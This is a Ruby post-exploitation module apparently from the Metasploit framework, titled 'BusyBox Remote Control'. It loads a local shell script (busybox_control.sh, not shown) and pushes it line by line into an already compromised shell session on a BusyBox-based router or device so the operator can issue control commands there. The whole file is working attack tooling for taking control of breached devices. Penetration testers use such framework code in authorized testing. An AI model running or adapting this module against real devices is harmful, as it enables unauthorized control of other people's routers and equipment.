##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Post

  def initialize
    super(
      'Name'         => 'BusyBox Remote Control ',
      'Description'  => 'This module will send a script to a open session
                         that is connected to a BusyBox sh shell. The script
                         will accept some commands to control the target
                         router or device executing BusyBox. Once the 
                         script is executed it will accept commands, use 
                         the help command to list the options of the script',
      'Author'       => 'Javier Vicente Vallejo',
      'License'      => MSF_LICENSE,
      'References'   =>
        [
          [ 'URL', 'http://vallejo.cc']
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell']
    )    
  end



  def run
    
    
    file = ::File.join(Msf::Config.data_directory, "post", "busybox_control.sh")

    count = 0

    ::File.open(file, "rb") do |f|
      while line = f.gets
      	vprint_status(line)
      	line = line.strip      	
        session.shell_write(line + "\n")
        count+=1        
        if count%20==0
          session.shell_read()
          Rex::sleep(0.001)
        end
      end
    end      
   
   vprint_status("BusyBox script sent.\n")
   
  end
 
end
